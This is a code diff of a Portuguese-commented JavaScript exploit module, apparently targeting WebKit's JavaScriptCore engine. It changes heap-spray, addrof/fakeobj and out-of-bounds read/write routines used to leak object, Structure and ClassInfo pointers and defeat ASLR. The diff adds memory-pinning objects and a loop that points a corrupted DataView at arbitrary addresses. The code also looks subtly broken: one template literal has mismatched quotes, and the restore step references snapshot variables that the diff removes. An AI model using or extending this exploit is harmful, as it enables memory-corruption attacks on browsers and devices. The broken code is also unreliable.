@@ -32,6 +32,7 @@ const LOCAL_LONG_PAUSE = 1000;
 let global_spray_objects = [];
 let pre_typed_array_spray = [];
 let post_typed_array_spray = [];
+let hold_objects = []; // Novo: Para reter objetos e evitar GC/movimentação
 
 // =======================================================================
 // NOVAS PRIMITIVAS ARB R/W UNIVERSAL BASEADAS EM ADDROF/FAKEOBJ
@@ -286,7 +287,7 @@ export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, p
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBuffer m_vector) ---`, "test");
+    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBuffer m_vector) ---`, "test`);
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
@@ -311,13 +312,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
         const sprayStartTime = performance.now();
-        const SPRAY_COUNT = 200000;
+        // Aumentando o spray e adicionando hold_objects para maior estabilidade
+        const SPRAY_COUNT = 500000; // Aumentado de 200000
         logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < SPRAY_COUNT; i++) {
             const dataSize = 50 + (i % 20);
             global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
         }
-        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
+        // Adicionar hold objects para tentar fixar o Uint8Array alvo.
+        // Crie um ArrayBuffer de tamanho médio e uma Uint8Array view para ele.
+        // O ideal é que o Uint8Array alvo da Fase 2.5 seja retido aqui.
+        // Para simplificar agora, apenas criamos mais objetos para reter o heap.
+        for (let i = 0; i < 1000; i++) { // 1000 objetos adicionais para retenção
+            hold_objects.push(new Uint8Array(1024 + (i % 100))); // Variar o tamanho para evitar coalescência simples
+        }
+        logFn(`Spray de ${global_spray_objects.length} objetos e ${hold_objects.length} hold objects concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
         logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
@@ -348,6 +357,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const leak_target_array_buffer = new ArrayBuffer(0x1000);
         const leak_target_uint8_array = new Uint8Array(leak_target_array_buffer);
 
+        // Retenha o objeto alvo para tentar evitar que o GC o mova.
+        hold_objects.push(leak_target_uint8_array);
+        hold_objects.push(leak_target_array_buffer);
+
         leak_target_uint8_array.fill(0xCC);
         logFn(`ArrayBuffer/Uint8Array alvo criado e preenchido.`, "debug");
         await pauseFn(LOCAL_SHORT_PAUSE);
@@ -357,69 +370,85 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`[REAL LEAK] Endereço do Uint8Array (JSArrayBufferView): ${typed_array_addr.toString(true)}`, "leak");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // 3. Ler o ponteiro para a Structure* do Uint8Array (JSCell) usando a *OLD* primitiva OOB (oob_read_absolute).
-        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* do Uint8Array base (JSCell) usando primitiva OOB original...`, "info");
+        // --- NOVO: BLOC DE DEPURACAO DETALHADA PARA LEITURA DE MEMORIA AO REDOR DO typed_array_addr ---
+        logFn(`[REAL LEAK] INICIANDO DEPURACAO DE MEMORIA AO REDOR DO Uint8Array (ENDEREÇO: ${typed_array_addr.toString(true)})...`, "debug");
+        const DEBUG_RANGE = 0x100; // Ler 0x100 bytes (256 bytes) em torno do alvo
+        const START_OFFSET_DEBUG = -0x50; // Começar 0x50 bytes antes do endereço alvo
+        const END_OFFSET_DEBUG = 0x50; // Terminar 0x50 bytes após o endereço alvo
+        const READ_SIZE = 8; // Ler em qwords (8 bytes)
 
-        // SALVAR ESTADO DO OOB_DATAVIEW_REAL
-        const oob_m_vector_snap = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, 8);
-        const oob_m_length_snap = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 4);
-        const oob_m_mode_snap = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, 4);
+        // Salvar estado do oob_dataview_real para restaurar depois da depuração.
+        const oob_m_vector_snap_dbg = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, 8);
+        const oob_m_length_snap_dbg = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 4);
+        const oob_m_mode_snap_dbg = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, 4);
 
-        // APONTAR OOB_DATAVIEW_REAL PARA O TYPED_ARRAY_ADDR
+        for (let offset = START_OFFSET_DEBUG; offset < END_OFFSET_DEBUG; offset += READ_SIZE) {
+            const current_debug_addr = typed_array_addr.add(offset);
+            logFn(`[REAL LEAK] DEBUG: Apontando OOB DV para ${current_debug_addr.toString(true)}`, 'debug');
+
+            // Apontar o oob_dataview_real para o endereço de depuração
+            oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, current_debug_addr, 8);
+            oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
+            // Tentar refresh
+            try { getOOBDataView().getUint8(0); getOOBDataView().setUint8(0,0); await pauseFn(5); } catch(e_dbg_refresh) {}
+
+            let val_read = AdvancedInt64.Zero;
+            try {
+                val_read = oob_read_absolute(0, READ_SIZE); // Ler do offset 0 do DataView
+                logFn(`[REAL LEAK] DEBUG: Offset ${toHex(offset, true)}: ${val_read.toString(true)}`, "debug");
+            } catch (e_read_dbg) {
+                logFn(`[REAL LEAK] DEBUG: ERRO ao ler offset ${toHex(offset, true)}: ${e_read_dbg.message}`, "error");
+            }
+            await pauseFn(1); // Pequena pausa entre leituras
+        }
+        logFn(`[REAL LEAK] FIM DA DEPURACAO DE MEMORIA AO REDOR DO Uint8Array.`, "debug");
+
+        // Restaurar estado do oob_dataview_real APÓS A DEPURACAO COMPLETA
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, oob_m_vector_snap_dbg, 8);
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, oob_m_length_snap_dbg, 4);
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, oob_m_mode_snap_dbg, 4);
+        await pauseFn(5); // Pequena pausa para estabilização
+        // --- FIM DO BLOCO DE DEPURACAO DETALHADA ---
+
+
+        // 3. (Original) Tentar ler o ponteiro para a Structure* do Uint8Array (JSCell) usando a *OLD* primitiva OOB (oob_read_absolute).
+        // Este é o bloco que tem falhado. Manter para ver se a depuração ou spray ajudaram.
+        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* do Uint8Array base (JSCell) usando primitiva OOB original... (PRIMEIRA TENTATIVA)`, "info");
+        // Re-apontar o OOB DV para o typed_array_addr para esta leitura específica, se a depuração o tiver mudado.
         oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, typed_array_addr, 8);
         oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
-        // FORÇAR REFRESH
-        try {
-            getOOBDataView().getUint8(0);
-            getOOBDataView().setUint8(0,0);
-            logFn(`[REAL LEAK] DEBUG: Tentativa de refresh explícito do oob_dataview_real concluída após redirecionamento para typed_array.`, 'debug');
-        } catch (e_refresh_leak) {
-            logFn(`[REAL LEAK] ALERTA: Erro durante refresh explícito do oob_dataview_real para vazamento: ${e_refresh_leak.message}`, 'warn');
-        }
-        await pauseFn(5); // Pequena pausa para estabilização
+        try { getOOBDataView().getUint8(0); getOOBDataView().setUint8(0,0); await pauseFn(5); } catch(e_refresh_leak_final) {}
 
         const typed_array_structure_ptr = oob_read_absolute(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET, 8);
 
-        // RESTAURAR ESTADO DO OOB_DATAVIEW_REAL
-        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, oob_m_vector_snap, 8);
-        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, oob_m_length_snap, 4);
-        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, oob_m_mode_snap, 4);
-        await pauseFn(5); // Pequena pausa para estabilização
+        // A restauração dos snapshots originais do OOB DV foi feita após o loop de depuração.
+
 
         if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
             const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Uint8Array com OOB original. Endereço inválido: ${typed_array_structure_ptr ? typed_array_structure_ptr.toString(true) : 'N/A'}.`;
             logFn(errorMsg, "critical");
-            throw new Error(errorMsg);
+            throw new Error(errorMsg); // A exploração falha aqui se a leitura for 0x0
         }
         logFn(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${typed_array_structure_ptr.toString(true)}`, "leak");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 4. Ler o ponteiro para a ClassInfo* da Structure do Uint8Array (usando OOB original)
-        // Novamente, manipular o oob_dataview_real para apontar para a Structure*
-        // SALVAR ESTADO DO OOB_DATAVIEW_REAL
-        const oob_m_vector_snap_2 = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, 8);
-        const oob_m_length_snap_2 = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 4);
-        const oob_m_mode_snap_2 = oob_read_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, 4);
+        // O restante do vazamento de ASLR da Fase 2.5 segue, usando a mesma lógica que tem falhado
+        // mas que agora será mais informativo com a depuração extra.
+        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a ClassInfo* da Structure do Uint8Array base (JSCell) usando primitiva OOB original...`, "info");
 
         oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, typed_array_structure_ptr, 8);
         oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
-        // FORÇAR REFRESH
-        try {
-            getOOBDataView().getUint8(0);
-            getOOBDataView().setUint8(0,0);
-            logFn(`[REAL LEAK] DEBUG: Tentativa de refresh explícito do oob_dataview_real concluída após redirecionamento para structure.`, 'debug');
-        } catch (e_refresh_leak_2) {
-            logFn(`[REAL LEAK] ALERTA: Erro durante refresh explícito do oob_dataview_real para vazamento ClassInfo: ${e_refresh_leak_2.message}`, 'warn');
-        }
-        await pauseFn(5); // Pequena pausa para estabilização
-
+        try { getOOBDataView().getUint8(0); getOOBDataView().setUint8(0,0); await pauseFn(5); } catch(e_refresh_leak_classinfo) {}
         const class_info_ptr = oob_read_absolute(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET, 8);
 
         // RESTAURAR ESTADO DO OOB_DATAVIEW_REAL
-        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, oob_m_vector_snap_2, 8);
-        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, oob_m_length_snap_2, 4);
-        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, oob_m_mode_snap_2, 4);
-        await pauseFn(5); // Pequena pausa para estabilização
+        // Esta restauração pode ser omitida aqui e feita apenas uma vez no final da FASE 2.5 se for mais robusto.
+        // No entanto, manter por enquanto para isolar o problema.
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, oob_m_vector_snap, 8); // Reutiliza os snapshots iniciais
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, oob_m_length_snap, 4);
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, oob_m_mode_snap, 4);
+        await pauseFn(5);
 
         if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
             const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Uint8Array's Structure com OOB original. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}.`;
@@ -560,6 +589,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         pre_typed_array_spray = [];
         post_typed_array_spray = [];
         global_spray_objects = [];
+        hold_objects = []; // Limpar também os objetos de retenção
 
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
         logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
